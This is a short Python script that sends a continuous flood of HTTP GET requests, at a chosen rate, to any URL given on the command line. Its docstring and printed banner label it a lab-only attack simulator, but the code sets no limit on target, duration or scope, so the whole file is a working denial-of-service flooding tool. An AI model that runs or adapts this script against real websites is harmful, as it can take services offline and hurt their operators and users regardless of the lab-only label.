#!/usr/bin/env python3
"""
HTTP flood attack simulator for lab testing only.
Usage: python3 http_flood.py <target_url> <requests_per_second>
"""
import sys
import time
import requests
from concurrent.futures import ThreadPoolExecutor

def send_request(url):
    try:
        requests.get(url, timeout=2)
    except:
        pass

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 http_flood.py <target_url> <requests_per_second>")
        sys.exit(1)
    
    url = sys.argv[1]
    rps = int(sys.argv[2])
    
    print(f"[LAB ONLY] Simulating {rps} requests/sec to {url}")
    print("Press Ctrl+C to stop")
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        while True:
            for _ in range(rps):
                executor.submit(send_request, url)
            time.sleep(1)

if __name__ == "__main__":
    main()
